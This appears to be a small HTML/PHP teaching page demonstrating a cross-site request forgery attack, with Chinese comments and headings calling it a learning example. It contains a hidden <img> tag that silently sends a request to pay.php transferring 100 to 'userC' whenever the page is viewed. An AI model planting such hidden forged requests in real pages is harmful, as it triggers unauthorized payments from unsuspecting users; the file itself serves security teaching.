<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <?php
    // TODO: 
    // 1.嵌入一個 CSRF 攻擊的 payload 使用 <img> 標籤，src="pay.php?to=userC&money=100"
    // 2.當使用者瀏覽頁面會載入個圖片時，會自動發送一個請求到 pay.php    
    ?>
    <h1>CSRF Hacker Pay</h1>
    <img src="pay.php?to=userC&money=100" style="display:none;">
    <h2>這是一個 CSRF 攻擊的範例</h2>
    <h2>當使用者瀏覽這個頁面時，會自動發送一個請求到 pay.php</h2>
    <h2>這個請求會將 100 元轉帳到 userC 的帳號</h2>
    <h2>請注意：這是一個範例，實際上不應該這樣做</h2>
    <h2>請勿在真實的網站上使用這種方式</h2>
    <h2>這個範例僅供學習使用</h2>       
</body>
</html>